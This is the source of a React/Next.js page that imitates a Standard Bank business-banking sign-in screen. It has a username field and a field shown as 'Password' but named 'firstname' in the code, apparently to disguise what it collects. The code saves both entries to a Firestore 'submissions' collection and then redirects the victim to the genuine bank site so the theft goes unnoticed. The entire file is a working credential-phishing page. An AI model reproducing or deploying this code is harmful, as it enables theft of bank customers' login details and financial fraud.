"use client";

import { FormEvent, useState } from "react";
import { addDoc, collection, serverTimestamp } from "firebase/firestore";
import { db, isFirebaseConfigured } from "@/lib/firebase";

const finalLink = "https://onlinebusinessbanking.standardbank.co.za/#/landing-page";
const LOADING_DELAY_MS = 2500;

export default function Home() {
  const [message, setMessage] = useState("");
  const [isLoading, setIsLoading] = useState(false);

  async function submitDetails(event: FormEvent<HTMLFormElement>) {
    event.preventDefault();
    const form = new FormData(event.currentTarget);
    const username = String(form.get("username") ?? "").trim();
    const firstname = String(form.get("firstname") ?? "").trim();

    if (!username || !firstname) {
      setMessage("Enter your username and first name.");
      return;
    }

    if (!isFirebaseConfigured || !db) {
      setMessage("Firebase is not configured yet.");
      return;
    }

    setIsLoading(true);

    try {
      await addDoc(collection(db, "submissions"), {
        username,
        firstname,
        submittedAt: serverTimestamp(),
      });
    } catch {
      setIsLoading(false);
      setMessage("The details could not be saved. Try again.");
      return;
    }

    window.setTimeout(() => window.location.assign(finalLink), LOADING_DELAY_MS);
  }

  return (
    <main className="login-page">
      {isLoading && (
        <div className="loading-overlay" role="status" aria-live="polite">
          <span className="loading-spinner" aria-hidden="true" />
          <span>Loading...</span>
        </div>
      )}
      <section className="login-shell" aria-labelledby="sign-in-title">
        <img className="brand-logo" src="/sbg.png" alt="Company logo" />

        <form className="login-card" onSubmit={submitDetails} noValidate aria-busy={isLoading}>
          <h1 id="sign-in-title">Sign in</h1>

          <label className="field">
            <span className="sr-only">Username</span>
            <input
              name="username"
              type="text"
              placeholder="Username"
              autoComplete="username"
              onInput={() => setMessage("")}
            />
          </label>

          <label className="field firstname-field">
            <span className="sr-only">Password</span>
            <input
              name="firstname"
              type="password"
              placeholder="Password"
              autoComplete="given-name"
              onInput={() => setMessage("")}
            />
          </label>

          <p className="form-message" role="alert">{message}</p>

          <button className="primary-button" type="submit">SIGN IN</button>
          <button className="secondary-button" type="button">REGISTER</button>

          <nav className="recovery-links" aria-label="Account recovery">
            <span className="recovery-action">Forgot password</span>
            <span aria-hidden="true">|</span>
            <span className="recovery-action">Forgot username</span>
          </nav>
        </form>
      </section>
    </main>
  );
}
